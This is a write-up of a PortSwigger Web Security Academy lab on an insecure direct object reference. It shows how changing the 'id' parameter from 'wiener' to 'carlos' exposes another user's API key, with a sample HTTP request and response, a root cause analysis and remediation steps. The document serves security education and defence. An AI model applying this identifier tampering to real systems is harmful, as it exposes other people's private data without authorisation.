# Lab 05 — User ID Controlled by Request Parameter

[![Category](https://img.shields.io/badge/Category-Broken%20Access%20Control-red)]()
[![Type](https://img.shields.io/badge/Type-Horizontal%20Broken%20Access%20Control-orange)]()
[![Severity](https://img.shields.io/badge/Severity-High-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/access-control)

> Part of the [Broken Access Control Labs](../README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | User ID Controlled by Request Parameter |
| **Vulnerability Class** | Horizontal Broken Access Control (IDOR) |
| **Weakness (CWE)** | CWE-639: Authorization Bypass Through User-Controlled Key |
| **Severity** | High |
| **Objective** | Retrieve another user's (`carlos`) API key via direct object reference. |

## 2. Summary

The account page resolves and renders user data strictly based on the `id` query parameter, without verifying that the parameter matches the identity of the currently authenticated session.

## 3. Proof of Concept (PoC)

**Step 1 — Authenticate:**  
Log in with credentials `wiener:peter`.

**Step 2 — Observe object reference:**  
Click **My Account** and note the URL pattern: `/my-account?id=wiener`.

**Step 3 — Tamper with reference:**  
Change the `id` parameter to a different, known username: `/my-account?id=carlos`.

**Step 4 — Exploit:**  
The page renders Carlos's account data, including his API key, directly in the response.


## 4. Evidence (Request / Response)

```http
GET /my-account?id=carlos HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<wiener-session>

HTTP/2 200 OK
...
API Key: 9f1c2...a44b
```

## 5. Root Cause Analysis

The server-side query (`SELECT ... WHERE username = :id`) uses the client-supplied `id` parameter as the sole selector for the record to display, with no ownership check (`id == session.user`) before rendering sensitive fields.

### Attacker vs. Defender Perspective

- **Attacker view:** Identify an object reference (ID/GUID/filename) in a request and systematically substitute values belonging to other users to access data outside the attacker's own scope.
- **Defender view:** Never trust a client-supplied identifier; always verify server-side that the authenticated session owns (or is authorized for) the specific object being requested.

## 6. Impact

Any authenticated user can enumerate and read other users' private data (API keys, PII) simply by changing a predictable identifier in the URL — a classic Insecure Direct Object Reference (IDOR).

## 7. Remediation

- Always verify object ownership server-side: confirm `request.id == session.user.id` (or that the session's role permits accessing arbitrary records) before returning data.
- Prefer deriving the target user from the authenticated session rather than trusting a client-supplied identifier for 'my account' style endpoints.
- Apply the same ownership check consistently across all endpoints exposing the same resource (API, web UI, mobile backend).
- Log and alert on access patterns indicating ID enumeration (sequential/rapid `id` changes from a single session).

## 8. References

- [PortSwigger — Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 2021 — A01: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
